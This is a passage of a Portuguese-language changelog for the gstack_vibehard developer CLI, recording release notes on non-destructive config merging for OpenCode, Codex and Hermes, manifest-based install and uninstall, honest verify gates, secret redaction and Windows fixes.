- **OpenCode `doctor --fix [--dry-run]`** (`src/installer/opencode-jsonc.js`): resolve o conflito `opencode.json` + `opencode.jsonc` com **parser JSONC tolerante** (comentários, trailing commas, respeitando strings). Faz **merge preservando OAuth/plugin/provider do usuário**, consolida em `opencode.json` e faz **backup de ambos**; só aplica com confirmação (`--yes` no não-interativo). `--dry-run` mostra o plano sem tocar em nada. JSONC realmente malformado cai em `manual` (não arrisca merge).
- **Trust fixes:** `safeCopyDir` agora faz **backup por arquivo interno** antes de sobrescrever; **Headroom não usa mais `uv pip install --system` por padrão** — usa ambiente isolado (`uv tool install`) ou `pip --user`; `--system` só com `GSTACK_HEADROOM_SYSTEM=1` (opt-in explícito).
- +13 testes (185 Node + 38 Python verdes; lint limpo). Fecha a fatia honesta da Fase 3 (audit→verify→segurança→trust/JSONC); `dream improve` (adapter local) fica para a próxima.

## [2.21.0] - 2026-06-17

### Fase 3 (2/3) — Redaction lib + GitOps sanitizado
- **Lib de redaction reutilizável** (`hooks/hooks/_redact.py` + `src/security/redact.js`, padrões em sincronia com `_output_guard`): `redact_secrets`/`redactSecrets` **mascaram** segredos/PII (o Output Guard só detectava). Eventos registrados têm **fingerprint (hash)**, nunca o segredo bruto.
- **GitOps sanitizado** (`stop.py`): antes de `gh issue create`, o body e o título passam por redaction; se a origem tinha segredo, a issue **NÃO é criada** e um evento sanitizado é gravado em `~/.gstack/security/events.jsonl` (fingerprint, sem segredo). O commit local do `gitops_pr_create` também redige o summary.
- **Reframe honesto:** isto é uma lib de redaction **pré-publicação**, não um interceptor do stream de render do harness (uma CLI não controla esse render — refletido na capability matrix, `supportsPreOutputInterception: false`).
- +8 testes (3 JS + 5 Python) (176 Node + 38 Python verdes; lint limpo).

## [2.20.0] - 2026-06-17

### Fase 3 (1/3) — Verify honesto + Dream Audit anti-placebo + Capability Matrix
- **Verify honesto** (`verify-runner.js`): status agora é `ready` / `ready_with_warnings` / `blocked` / `pending_product` — **nunca declara "PRONTO" com runtime/preview pendente** quando o projeto roda (`start`/`dev`). Fallow/QG ausente vira **`tool_missing`** (não sucesso silencioso); roda **QG L1 e L2**; qualquer gate que falha bloqueia; `reducedTrust` quando o harness ativo é best-effort.
- **Dream Audit** (`src/dream/auditor.js` + `gstack_vibehard dream audit`): **determinístico, sem LLM, somente-leitura** — compara promessas (CLAUDE.md/README/docs) contra evidência real no código e classifica cada claim **REAL / PARTIAL / PLACEBO / ROADMAP / RISK**. `dream status` mostra a matriz de confiança por harness.
- **Harness Capability Matrix** (`src/dream/capabilities.js`): capacidades reais por harness; **honesta** — `supportsPreOutputInterception: false` em todos (uma CLI não intercepta o render do harness; o Output Guard é auditoria posterior, marcado como RISK no audit).
- +5 testes + verify reescrito (173 Node + 33 Python verdes; lint limpo).

## [2.19.0] - 2026-06-17

### Camada de confiança (3/3) — `verify` (delivery gates honestos, Replit-like)
- **`gstack_vibehard verify [--profile scaffold|full] [--json]`:** orquestra os gates de entrega do projeto — `deps` → `lint` → `typecheck` → `test` → `build` → `qg-l1`. **Só roda o que existe**; gates ausentes viram `not_applicable` (nunca finge passar). `runtime:start`/`preview:open` são `pending_feature` (roadmap). Salva `.gstack/runs/<runId>/verify.json`. `ready` só é `true` quando nenhum gate falhou.
- `src/project-plan/verify-runner.js` (puro, `exec` injetável, win32-aware) + `src/commands/verify.js`.
- Fecha a camada transversal de confiança (safe-write/manifest → uninstall restaurativo/integrity → verify). +3 testes (165 Node + 33 Python verdes; lint limpo).

## [2.18.0] - 2026-06-17

### Camada de confiança (2/3) — Uninstall restaurativo + Integrity Doctor
- **Uninstall manifest-driven + flags:** `--dry-run` (mostra o plano de rollback do manifest sem tocar em nada), `--restore-only` (só restaura backups), `--remove-vault` (remove `~/gstack-vault`), `--remove-deps`/`--include-projects` (honestos: não automatizam remoção de deps globais nem apagam projetos). `removeSkills` agora é **manifest-driven** — remove só skills que o manifest prova serem nossas (nunca uma skill do usuário com nome colidente); fallback ao padrão para instalações legadas.
- **`doctor --install-integrity` (`src/installer/integrity.js`):** valida manifest presente, backups existentes, **drift de hash** (arquivo alterado desde a instalação), itens registrados presentes e configs JSON parseáveis; diz se o **uninstall seria seguro**.
- +4 testes (162 Node + 33 Python verdes; lint limpo).

## [2.17.0] - 2026-06-17

### Camada de confiança (1/3) — Safe Write + Manifest como fonte de verdade
Primeira fatia do "fechar em produção com rollback" (PRDs faseprebuilt). Decisão: **ownership por manifest** em vez de renomear 109 skills para `g_` (mesma garantia de segurança, sem rename arriscado).
- **`src/installer/safe-write.js`:** camada única de escrita global — `safeWriteFile`/`safeCopyFile`/`safeCopyDir`/`safeAppendBlock`. **Backup obrigatório versionado** (`.gstack_vibehard.bak`, depois `.bak.1`/`.bak.2`, nunca sobrescreve), **escrita atômica**, **hashes** (original + instalado) e registro no manifest. Falha no backup **bloqueia** a escrita.
- **`src/installer/manifest.js`:** manifest em `~/.gstack_vibehard/install-manifest.json` com `items[]` (`path/kind/action/owner/component/backup/hashes/removeOnUninstall/restoreOnUninstall`). Backward-compatible (preserva `agentDirectories`/`agentmemory`).
- **Ownership real:** `install` registra skills/scripts criados (e não os pré-existentes do usuário); `agent-distribution` preserva `items[]` em vez de sobrescrever o manifest. Base para o uninstall manifest-driven (próxima release).
- +5 testes (158 Node + 33 Python verdes; lint limpo).

## [2.16.0] - 2026-06-17

### Hermes MCP seguro (VPS-safe) + gates honestos (revisão Codex P3)
- **Hermes MCP reescrito a partir da doc oficial** (`hermes_cli/mcp_config.py`, config reference): o `hermes mcp add` é **interativo** (podia travar um install) e os flags assumidos estavam errados. Agora o gstack escreve `mcp_servers` em `~/.hermes/config.yaml` com o **schema verificado** (`command`/`args`/`env` + `enabled`), de forma **VPS-safe**:
  - `config.yaml` **ausente** → cria com `mcp_servers` e **`enabled: false`** (Hermes não tenta conectar até o usuário habilitar o que tem).
  - `config.yaml` **existente** → **nunca tocado**; gera um snippet mergeável em `~/.hermes/gstack-mcp-servers.yaml` + orientação (mesclar e `/reload-mcp`).
  - Zero dependência nova; nada interativo; uninstall remove o snippet sem tocar no `config.yaml`.
- **Gates honestos:** novo `npm run lint` (zero-dep — `node --check` em todo `src/`+`tests/`+`scripts/`) e `npm run typecheck` honesto (declara que o projeto é ESM puro, sem TS; não finge gate). Meta-teste trava o lint no CI.
- +5 testes Hermes reescritos + lint test (153 Node + 33 Python verdes).

## [2.15.0] - 2026-06-17

### Endurecimento P2 do executor de planos (revisão Codex)
- **Sem `cmd.exe /c`:** o runner agora invoca a **própria CLI via Node** (`process.execPath` + `src/index.js`) com **array de argumentos puro** — cross-platform e imune a quoting/injeção do `cmd.exe`. Como planos ficam persistidos/editáveis em `.gstack/plans/*.json`, há **allowlist**: só `gstack_vibehard` é executável; comando adulterado é rejeitado antes de rodar.
- **Journal sem segredos:** `step_started` grava o comando **sanitizado** (`sanitizeCommand` redige valores após flags sensíveis `--token/--key/--secret/...`, `KEY=VALUE` sensível e credenciais embutidas em URL) — nunca o comando bruto.
- +3 testes (150 Node + 33 Python verdes).

## [2.14.0] - 2026-06-17

### Confiabilidade P1 (revisão Codex) — bugs ativos
- **`workflow inspect --json` sem `<runId>`** tratava `"--json"` como runId (`flags._[0] || args[1]`) e retornava JSON "de sucesso" com `runId:"--json"`. Agora usa só `flags._[0]` (o parseFlags já separa flags de posicionais) → retorna `{"error":"missing runId"}`. Perigoso para automação, corrigido.
- **`create` EBUSY no Windows:** os boots best-effort (AgentMemory/Graphify/Headroom) rodavam `npx` real contra o `projectDir` mesmo em teste, deixando handles presos → `EBUSY` na limpeza. Adicionado guard `GSTACK_SKIP_SIDE_EFFECTS` no `safeExec` (testes/CI não spawnam processos externos) + `maxRetries/retryDelay` na limpeza do teste.
- +1 teste de regressão (147 Node + 33 Python verdes).

## [2.13.0] - 2026-06-17

### Pending-features (roadmap honesto) + fix de classificação
- **`src/project-plan/pending-features.js`:** registro único de features futuras (`runtime:start|logs|open`, `dashboard:open`, `deploy:preview|production`). O `planner` passou a consultar esse registro (fonte única) em vez de tratar `runtime:start` inline — todos viram `pendingFeature` (sem comando), aparecem no plano como "ainda não implementado" e o executor **nunca** os roda.
- Recipes `saas-auth-stripe` e `web-app` ganham `deploy:preview` como passo de roadmap.
- **Fix de classificação:** a keyword greedy `"app"` na recipe `mobile-backend` roubava "web app" → removida. Agora "web app" → `web-app` e "app mobile" continua → `mobile-backend`.
- +3 testes (146 Node + 33 Python verdes). Encerra os 4 PRDs pendentes (só PR8/dashboard-contract fica como roadmap).

## [2.12.0] - 2026-06-17

### Loop Patterns library — o `task` escolhe o ciclo certo (inspirado no Kilo)
Biblioteca determinística (sem LLM) que faz o Loop Engineer (`task`) escolher o ciclo seguro por tipo de trabalho:
- **`src/project-plan/loop-patterns.js`** — 5 padrões: `test-driven`, `compiler-driven`, `review-driven`, `runtime-debugging`, `product-iteration`. Cada um com contexto, estratégia de ação, perfil de verificação, regras de parada e **comandos reais** (`context search`, `workflow run`, `delegate opencode --worktree`).
- **`verification-profiles.js`** — sinais/critérios e comandos preferidos+fallback por perfil; preview/browser é **opcional** (runtime futuro).
- **`stopping-rules.js`** — regras mapeadas para o `loop-budget` real (`maxIterations`, `maxConsecutiveSameFailure`, `maxWallTimeSeconds`, `humanHandoffOnCap`); as demais ficam declarativas.
- **`loop-classifier.js`** — classifica o pedido por keywords + sinais (`hasFailingTest`/`hasRuntimeError`); sem sinais → `test-driven` (mais seguro).
- **Integração no `task`:** o plano agora traz `loopPattern`/`loopReason`/`verificationProfile`, imprime "Loop escolhido: …", e a delegação OpenCode usa **`--worktree`** (isolado). Nenhum loop executa comando real. +12 testes (143 Node + 33 Python verdes).

## [2.11.0] - 2026-06-17

### Segurança OpenCode — não sombrear `opencode.jsonc` (config do Desktop/OAuth)
**Bug de produção corrigido:** o `installOpenCode` escrevia `~/.config/opencode/opencode.json` incondicionalmente, podendo **sombrear o `opencode.jsonc`** do usuário (Desktop com plugin OAuth, providers, etc.).

Confirmado na **documentação oficial do OpenCode** (config/plugins/skills): plugins auto-carregam de `~/.config/opencode/plugins/` e skills de `~/.config/opencode/skills/` **e `~/.agents/skills/`** (onde o gstack já instala) — **tudo sem entrada no config**. A coexistência `.json`+`.jsonc` no mesmo diretório **não é documentada**. Logo, o gstack integra por **diretórios auto-carregados, com zero escrita de config**.

- **Novo `src/harness/opencode-config.js`:** `inspectOpenCodeConfig(home)` decide a estratégia — `json_merge` (só `.json`: merge não-destrutivo), `directory_only` (só `.jsonc` **ou** nenhum config: nunca cria `.json`), `conflict_warn_only` (ambos: não escreve nada + alerta).
- **`installOpenCode`** agora só escreve `opencode.json` no caso `json_merge`; sempre copia os plugins gstack (auto-load). Nunca edita `.jsonc` nem remove plugin OAuth.
- **`detector`** reconhece `opencode.jsonc`; **`check`** considera OpenCode integrado por plugins/skills (não exige mais `opencode.json` com a string); **`doctor`** mostra `.json`/`.jsonc`/conflito + remediação segura (backup manual, nunca delete).
- README: seção de troubleshooting. +8 testes (135 Node + 33 Python verdes).

## [2.10.0] - 2026-06-17

### Camada Replit-like — wizard `start` + Loop Engineer `task` (PR4 + PR7) — MVP completo
- **`gstack_vibehard start` (PR4):** assistente guiado para usuário leigo. Pergunta objetivo → nome → modo (mostra a copy completa **leve vs completo** e recomenda por recipe), exibe o plano e **só executa após confirmação** (cancelar salva o plano para `plan run` depois). `src/project-plan/wizard.js` é puro (UI injetável) e reusa planner + executor.
- **`gstack_vibehard task "<pedido>"` (PR7):** Loop Engineer de feature/bugfix. Gera plano usando o **Document Graph** (`context search/related` quando há índice) + **workflow determinístico** + **delegação OpenCode**. O **OpenCode NUNCA é executado sem confirmação** (step `requiresConfirmation`); plano persistido em `.gstack/tasks/<id>/`. `task status/diff/accept/reject` são honestos sobre o motor de execução ainda não existir.
- Fecha o MVP da experiência guiada (PRs 1–5 e 7; PR6 já coberto por `pendingFeature`; PR8 dashboard adiado). +9 testes (127 Node + 33 Python verdes).

## [2.9.0] - 2026-06-17

### Camada Replit-like — executor de planos (PR5)
Agora o plano **executa de verdade**, com execução segura:
- **`src/project-plan/executor.js` + `journal.js` + `state.js`:** roda os passos reais em ordem, grava `.gstack/plans/<id>/journal.jsonl` (só **resumo** — nunca output bruto/secrets) e `status.json` por passo. **Para no primeiro erro** de passo obrigatório (não esconde falha); passo opcional que falha não derruba o plano; **retomável** (passos concluídos viram `journal_hit` e não re-executam); `pendingFeature` é pulado.
- **`plan run <id>` / `plan status <id>` / `plan explain <id>`:** `run` mostra o plano e **pede confirmação** antes de executar (sem TTY exige `--yes`; recusa execução silenciosa); `--with-optional` habilita passos opt-in; `explain` diz **por que** cada passo existe; `--json` puro em todos.
- Runner win32-aware (comandos `gstack_vibehard …` via `cmd.exe` no Windows). +9 testes (118 Node + 33 Python verdes).

## [2.8.0] - 2026-06-17

### Camada Replit-like — fundação Project Plan + comando `plan` (PRs 1–3)
Primeira fatia da experiência guiada: o usuário descreve o objetivo e o gstack gera um **plano determinístico** (sem LLM) com **comandos reais**, modo leve/completo e integrações sugeridas.
- **`src/project-plan/` (PR1+PR2):** `schema.js` (formato/validação de plano — bloqueia passos destrutivos e passos `pendingFeature` com comando), `modes.js` (copy honesta de **leve vs completo**: includes/excludes/bestFor/deps/tradeoffs), `recipes.js` (7 recipes MVP, **todas mapeadas para os 4 templates reais** e integrações reais de `SUGGESTIONS_BY_TEMPLATE`), `classifier.js` (classificação por keywords, sem LLM) e `planner.js` (expande step-ids em comandos reais; `runtime:start` vira `pendingFeature`, **nunca um comando fictício**).
- **`gstack_vibehard plan "<objetivo>"` (PR3):** imprime o plano (passos + comandos + modo), persiste em `.gstack/plans/<id>/`, `--json` puro, `--dry-run`, `--name/--mode/--recipe`. **Não executa nada** (executor chega no próximo release; `plan run/status/explain` respondem honestamente que a execução ainda não existe).
- Princípios honrados: plano sempre mostrado antes de qualquer execução, nada destrutivo, comandos avançados intactos. +13 testes (113 Node + 33 Python verdes).

## [2.7.0] - 2026-06-16

### Hermes (NousResearch) como harness de primeira classe — fala MCP nas duas direções
- **Detecção:** o `install` agora reconhece o **Hermes CLI** (via `~/.hermes/` ou `hermes --version`).
- **Integração em 3 camadas (da mais garantida à best-effort), `src/harness/hermes.js`:**
  1. **Skills** copiadas para `~/.hermes/skills/` (filesystem — não sobrescreve skills do usuário).
  2. **Guidance instrucional** em `~/.hermes/AGENTS.md` (mesmo protocolo QG/memória/economia-de-tokens dos demais harnesses sem hooks).
  3. **Registro MCP** dos servidores do gstack (de `mcp-configs/base.mcp.json`) via `hermes mcp add <name> --command …` — **só executa se o binário `hermes` existir**, totalmente guardado (falha = skip, nunca fatal). Deixamos o **próprio Hermes** persistir o config no formato dele, em vez de adivinhar o schema YAML (não corrompe config alheio).
- **Uninstall** simétrico: remove as skills gstack de `~/.hermes/skills` e tira o bloco instrucional do `~/.hermes/AGENTS.md` (preservando o conteúdo do usuário fora dos marcadores).
- Tudo offline e idempotente; nenhuma dependência nova. +3 testes (103 Node + 33 Python verdes).

## [2.6.2] - 2026-06-16

### Correções da revisão Codex (6 bugs reais)
- **`context search|related|explain --json` agora emite JSON PURO** — o banner/`section` era impresso *antes* do JSON, poluindo a saída-máquina (MCP/automação). No modo `--json`, header e mensagens humanas são suprimidos; erros viram objeto JSON (`{"error":"no_index"}`). `explain --json` retorna um objeto combinado `{topic, search, related}`.
- **`workflow inspect` sem `<runId>`** chamava `readJournal(base, undefined)` e quebrava com *"path must be of type string"*. Agora valida o `runId` **antes** de tocar o disco (erro limpo no modo humano e `{"error":"missing runId"}` no `--json`).
- **`workflow run` instruction-only** (delegação OFF) marcava `passed` mesmo sem executar trabalho — o verde refletia o estado pré-existente, não a tarefa. Agora o resultado traz `executed:false` + `warning` (`instruction_only`), registrado no journal (`run_warning`) e exibido no CLI.
- **Replay do workflow:** se o processo morria **entre** `worker#N` (concluído) e `verifier#N` (não rodou), o resume pulava para `N+1`, deixando trabalho não verificado. Agora retoma em `N`, reaproveita o worker via `journal_hit` e roda o verifier que faltou.
- **Graphify bridge `implemented_in`:** a aresta era gravada como `document→code` e o `related` a atribuía a **toda** entidade citada no mesmo doc. Agora é `entity→code` (`from_id=entity_id`); o código é atribuído só à entidade que casa o nó do grafo.
- **`create.js` chamava `npx` direto** (ENOENT no Windows) em AgentMemory/Graphify/Headroom. Agora via `npxArgv()` (`cmd.exe /c npx` no win32).
- +7 testes de regressão (100 Node + 33 Python verdes).

## [2.6.1] - 2026-06-16

### Obsidian por padrão — detecção automática + escolha obrigatória
- O Obsidian agora é **parte padrão** do produto. Se o app estiver instalado, o `gstack_vibehard install` e o `context init` **detectam os vaults** (lendo o `obsidian.json` do OS) e **exigem uma escolha**: indexar um vault detectado, digitar outra pasta, ou **"pular por enquanto"**.
- **Invariante de segurança mantida — detectar ≠ indexar:** a detecção lê só o `obsidian.json` (existência + paths), **nunca o conteúdo das notas**. A indexação (read-only) só ocorre da pasta **explicitamente escolhida**; "pular" → nada é lido. Nunca abre o app, cria cofre ou varre vault global implícito.
- Default global em `~/.gstack/context-defaults.json` (projetos herdam); `getObsidianPath` resolve **projeto > global**.
- **Não-interativo (CI) nunca trava** — pula com aviso para `context obsidian set`.
- +3 testes (95 Node + Python verdes).

## [2.6.0] - 2026-06-16

### Document Graph: Obsidian + Graphify bridge + A2A Card (PR2/PR5/PR6 do PRD)
- **Obsidian como fonte (opt-in, read-only):** `context obsidian set <pasta>` registra uma pasta; `context index` a indexa (`source=obsidian`, wikilinks → `links_to`). **NÃO abre o app, NÃO cria cofre, NÃO escreve no cofre, NUNCA varre vault global implícito** (nem o `~/gstack-vault`). Pasta ausente não quebra.
- **Graphify bridge:** se `graphify-out/graph.json` existir (auto-detect), o indexer cria edges ligando entidades de doc ao **grafo de código** — `implemented_in` e `depends_on` aparecem em `context related`/`explain`. Ausência degrada sem erro.
- **A2A Agent Card:** `gstack_vibehard a2a card` imprime um Agent Card **JSON válido** (formato A2A) descrevendo capacidades reais (context.search, workflow.run, quality.gate, delegate.opencode). **Nenhum servidor**, nenhum agente externo registrado. Banner suprimido em saída-máquina (`--json`/`a2a`).
- Tudo offline, sem dep nativa, sem rede. +9 testes (92 Node + Python verdes).

## [2.5.0] - 2026-06-16

### Document Graph local — GraphRAG offline (PR1 do PRD)
Busca documental determinística, **offline, sem LLM, sem rede, sem dependência nativa** — o agente consulta o índice em vez de reler arquivos (economia de tokens).
- **`context index`** indexa `docs/{adr,prd,plans,research}` + `README`/`CHANGELOG` num **SQLite com FTS5** em `.gstack/context/context.db`. Indexer em **Python stdlib** (`sqlite3` estável desde 2006 + FTS5 estável desde 2015) — **nada experimental**, zero dep nativa npm; fallback `LIKE` se FTS5 faltar. Invocado pelo comando JS via `resolvePythonCmd` (padrão `qg.py`).
- **`context search "<q>"`** (FTS5 → path/heading/trecho/score, `--json`), **`context related <Entidade>`** (mentions/links_to/tagged_as), **`context explain "<tópico>"`** (docs + entidades), **`context status --db`** (documents/chunks/entities/edges + estado FTS).
- **Incremental por hash** (pula inalterado), **remoção em cascata**, entidades por heurística (wikilink/tag/PascalCase/tech + stopwords). Segurança: não indexa `.env`/secrets/`.git`/`node_modules`.
- session_start mostra 1 linha de counts do índice (summary-only, query read-only).
- 4 testes Python (idempotência/incremental/remoção/segurança/FTS) + 2 JS (bridge). 88 Node + Python verdes.

## [2.4.1] - 2026-06-16

### Workflow runner replayable + delegação OpenCode segura (gaps do v2.4.0)
Review do PRD identificou gaps reais na fundação v2.4.0 — corrigidos:
- **`maxWallTimeSeconds` agora é aplicado** (deadline determinístico por iteração; antes era só anunciado). (`runner.js`)
- **Replay completo:** `worker#N`/`verifier#N` também geram `journal_hit`; `workflow run --run-id <id>` **retoma** um run pulando nós já concluídos. (`runner.js`, `workflow.js`)
- **`workflow inspect --json`** para automação. (`workflow.js`)
- **`delegate --worktree`:** roda o OpenCode numa **git worktree isolada** — nunca toca o branch principal; commita o trabalho num branch efêmero e o **preserva para revisão** (`git merge <branch>`). (`delegation/worktree.js`, `opencode.js`)
- **`delegate --max-iterations` agora tem efeito** (retenta em falha); a delegação **lê `.gstack/loop-budget.json`** (timeout = `maxWallTimeSeconds`, `maxIterations`). (`opencode.js`, `delegate.js`)
- +8 testes (86 Node + 24 Python).

## [2.4.0] - 2026-06-16

**Workflows agênticos: Context Docs + Loop Budget + Graph Runner determinístico + Delegação OpenCode.**

Grafo determinístico — **LLM decide dentro do nó, código decide as arestas**. O gstack **não faz model calls**: delega ao OpenCode (modelo/free tier do usuário) e verifica de forma determinística (testes/Fallow). Tudo opt-in, com caps e circuit breakers.

- **Context docs** (`context init/status`): `.gstack/context.json` + `docs/{adr,prd,plans,research}`; session_start injeta **resumo summary-only** (contagens + policy), sem ler conteúdo → economia de tokens.
- **Loop budget** (`.gstack/loop-budget.json`): `maxIterations`, `maxConsecutiveSameFailure` (circuit breaker → human handoff), `maxWallTimeSeconds`; validação. Delegação opt-in (`enabled:false`, `requiresUserApproval:true`).
- **Journal/replay** (`src/workflow-graph/journal.js`): eventos por run em `journal.jsonl`; replay pula nós concluídos (`journal_hit`); nunca persiste secret/transcript.
- **`delegate opencode --task ... [--yes]`**: roda `opencode run` (args em array, shell:false), retorno **estruturado** (summary + exitCode + changedFiles via git), confirmação obrigatória; não-interativo exige `--yes`.
- **`workflow run --task ...`**: orquestra worker → verifier (determinístico: suíte de testes) → retry/handoff respeitando o loop budget. **`workflow runs`/`inspect`**: observability via journal.
- **stop.py**: loop-tracking cross-harness em `~/.gstack/loop-state.json` (não Codex-only) — circuit breaker barato e gracioso.
- **`.gitignore`**: `.claude/settings.local.json` e `.docs/`.
- +21 testes (79 Node + 24 Python). Construído em branch isolado, mergeado após verde total.

## [2.3.5] - 2026-06-16

### Re-rodar `install` atualiza hooks obsoletos (raiz dos falsos positivos do QG)
- **Bug:** quando todos os harnesses já estavam "instalados", `install` fazia early-return e **pulava o refresh dos hooks** — então um `qg.py` antigo (com heurísticas React de loading/error, propensas a falso-positivo, ex.: "componente com useEffect sem loading" em arquivo sem useEffect) **nunca era substituído**; a única saída era `rm` manual. Agora `install` **sempre atualiza os hooks** para a versão do pacote (idempotente, com backup `.bak`), inclusive no caminho "já configurado". O `qg.py` atual é o wrapper determinístico do Fallow (sem heurísticas React).
- Refactor: lógica de cópia de hooks extraída para `refreshHooks()` e chamada nos dois caminhos.

## [2.3.4] - 2026-06-16

### Correções da revisão (Codex) — robustez do `tools`
- **[P2] MCP só habilita se a ferramenta existe.** `tools mcp enable <tool>` agora bloqueia se a ferramenta não está em `installed` (registry) ou se `<tool>-pp-mcp` não responde — evita o harness falhar ao carregar MCP com "command not found". (`mcp.js`, `tools.js`)
- **[P2] `tools install` migra registries antigos.** Projetos criados antes da feature (sem o bloco `printingPress`) não explodem mais — `readRegistry` normaliza para o schema atual com defaults. (`tools.js`)
- **[P2] Go por arquitetura no Linux.** O auto-install não baixa mais sempre `linux-amd64`; mapeia `process.arch` (x64→amd64, arm64→arm64, arm/ppc64/s390x) e **não auto-instala** em arch desconhecida (orienta). (`install.js`)
- **[P3] `tools uninstall` não "esquece" em falha.** Só remove do registry quando a desinstalação real teve sucesso; em falha, mantém a entrada marcada `uninstall_failed`. (`tools.js`)
- **[P3] Help completo.** O help de `tools` agora lista todos os subcomandos (install/uninstall/installed/mcp/doctor/generate), não só discovery. (`tools.js`)
- +5 testes (58 Node + 24 Python verdes).

## [2.3.3] - 2026-06-15

### Instaladores macOS/Windows + README passo a passo
- **Fórmula Homebrew (macOS) consertada.** Estava congelada na v0.4.0 com `sha256` placeholder ("Will be updated…") — quebrada. Atualizada para v2.3.2 com o sha256 real; `post_install` pesado removido (passa instruções via `caveats` em vez de baixar deps durante o `brew install`).
- **Mensagem do instalador no macOS** corrigida — não anuncia mais um tap Homebrew inexistente; recomenda `npm install -g` (caminho real) e aponta a fórmula no repo.
- **Launchers Windows** (`install.bat`/`gstack_vibehard.cmd`) auditados — funcionais (checam Node, rodam via `npx`).
- **README — "Modo de Uso" reescrito passo a passo** com cada função documentada: `doctor`, `install` (+`--skip-deps`), `create` (+`--lite`/`--template`), `init`, `tools` (todos os subcomandos), `monitor`, `sprint`, `list`, `uninstall` (+`--yes`).

## [2.3.2] - 2026-06-15

### Correção crítica de Windows (revisão de todo o código)
- **`npx` quebrado no Windows.** `execFileSync("npx", …, {shell:false})` dá ENOENT no Windows (`npx` é `npx.cmd`). Isso quebrava: **`tools list/search/install`** (Printing Press — 100% inoperante no Windows), **`playwright install`** no instalador, **`playwright --version`** no doctor, e **`fallow audit`** no monitor TUI. Centralizado num helper `npxArgv` (em `deps.js`) que usa `cmd.exe /c npx …` no Windows (sem `shell:true`, evitando a deprecation de args não-escapados do Node). Validado end-to-end: `tools search` agora retorna o catálogo real no Windows; `doctor` detecta o Playwright. (`src/installer/deps.js`, `cli.js`, `install.js`, `doctor.js`, `monitor.js`)

## [2.3.1] - 2026-06-15

### Zero-config consistente: Go instalado sob demanda
- `tools install <slug>` agora **instala o toolchain Go automaticamente** se ausente (como o projeto já faz com bun/uv/Rust/Chromium) — antes só orientava o usuário a instalar manualmente. Instalação **sob demanda** (não no bootstrap, para não forçar ~150MB em quem não usa Printing Press): Windows via winget/choco, macOS via brew, Linux via tarball oficial em `~/.local/go` (sem sudo). `ensureGo` adiciona o Go ao PATH da sessão e verifica antes de prosseguir; opt-out via `GSTACK_SKIP_GO=1`. Se a instalação do Go falhar, degrada para `needs_go` com instrução. (`src/printing-press/install.js`)
- `doctor`: mensagem ajustada — `tools install` instala Go sob demanda.

## [2.3.0] - 2026-06-15

**Integrações híbridas — Composio (nuvem) + Printing Press (local).**

Nova arquitetura de **dupla via** para ferramentas, sem substituir o Composio existente (`@composio/mcp`, já detectado em `session_start.py`):
- **Composio (nuvem):** auth OAuth + ações de **escrita** nos apps padrão.
- **Printing Press (local):** **leitura** de alta frequência via CLI Go + SQLite e cauda-longa sem API. Roteamento padrão: leitura→local, escrita→nuvem.

Tudo **opt-in, project-scoped e não-destrutivo** — nada é instalado no bootstrap.

- **PR1 — Registry:** todo projeto criado ganha `.gstack/integrations.json` (schema dual-lane, `schemaVersion:1`) com ferramentas sugeridas por template (saas→stripe/linear/sentry; ai→github/slack/notion/sentry; mobile→revenuecat/firebase/supabase/sentry; fullstack→github/sentry/linear). Declarativo: `enabled:false`, não instala nada.
- **PR2 — `gstack_vibehard tools`** (alias `pp`): `list`/`search`/`suggested`/`enable-printing-press`. Wrapper seguro do `@mvanhorn/printing-press-library` (versão pinada, args em array, `shell:false`, query validada). Degrada gracioso sem rede; **nunca toca `.mcp.json`**.
- **PR3 — `tools install/uninstall/installed`:** opt-in. Detecta Go (o `install` upstream usa `go install`); sem Go → orienta, não instala. **Verifica o binário** (`~/go/bin`) antes de marcar `installed`. Não pede credencial, não escreve `.env`.
- **PR4 — `tools mcp enable/disable/list`:** registra MCP `pp-<tool>` no `.mcp.json` **do projeto** (merge não-destrutivo, usuário vence em colisão; disable remove só o `pp-*` do gstack).
- **PR5 — `tools doctor`** (probe progressivo por capacidade) + seção "Integrações" no `doctor` principal (status Composio + Go/Printing Press). `tools generate` (cauda-longa via HAR) é **stub honesto** — o pacote `cli-printing-press` ainda não existe no npm.
- **Segurança/rollback:** desenvolvido em branch isolado; `RETORNOGO.md` documenta a âncora de retorno (v2.2.4) e os procedimentos. +21 testes (49 Node + 24 Python), todos hermes (exec injetável, sem rede/sem instalar binários).

## [2.2.4] - 2026-06-15

**Revisao round-2: arestas restantes de "nao travar / nao destruir".**

- **[P1] Deploy nao trava mais no audit.** `run_security` (deploy) deixou de ativar o `fallow audit` pesado (60s) no Stop — o Security Gate (checks locais) ja roda separado e devolve o bloqueio na hora. Um deploy com Dockerfile invalido nao "congela" antes do veredito. (`stop.py`)
- **[P2] `create --lite` 100% honesto.** O resumo final nao imprime mais `IAM: http://localhost:8000 (admin/123)` em modo lite. (`create.js`)
- **[P2] Merge do Codex preserva hooks do usuario.** Em vez de trocar o array inteiro (`on_stop` etc.), agora ANEXA os comandos gstack preservando os do usuario, com dedupe; o uninstall remove so os comandos gstack. (`codex.js`)
- **[robustez] QG degrada gracioso sem Fallow.** `qg.py` tratava Fallow ausente/stdout vazio como bloqueio CRITICO (falso positivo, ja que Fallow e opcional). Agora PULA (pass, verdict `skipped`) com instrucao de instalacao. (`qg.py`)
- **DX:** `npm run test:py` cai para `python -m unittest` quando pytest nao esta instalado (testes sao unittest).

## [2.2.3] - 2026-06-15

**Correcoes de revisao orientada a bugs reais (6 P1 + instalacao do pytest).**

### Hooks deixam de ser intrusivos
- **Stop nao atrasa mais cada resposta.** `fallow audit` (60s) + QG legado (60s) rodavam em TODO Stop (dispara a cada turno) — ate ~2min de atraso por turno. Agora opt-in via `GSTACK_STOP_AUDIT=on` (ou automatico em deploy/qg_level). (`stop.py`)
- **Stop nao cria branch/commit sem consentimento.** `gitops_pr_create` (git checkout -b + add + commit) agora opt-in via `GSTACK_AUTO_PR=1`. (`stop.py`)
- **Auto-save nao commita mais o repo principal.** `git_worktree_autosave.py` commitava o repositorio principal a cada Stop; agora opt-in via `GSTACK_AUTOSAVE_MAIN=1`. Worktrees efemeros do Agent View seguem protegidos.

### Instalacao do Codex nao-destrutiva
- **`~/.codex/config.toml` deixou de ser sobrescrito.** Antes o install substituia o arquivo inteiro (perdia MCPs/modelos/permissoes do usuario). Agora merge via `smol-toml`: hooks gstack vencem; agent/mcp_servers o usuario vence. uninstall remove apenas as chaves gstack, preservando a config do usuario (e nao remove servidor de mesmo nome se customizado). (`codex.js`, `uninstall.js`)

### Templates verticais executaveis
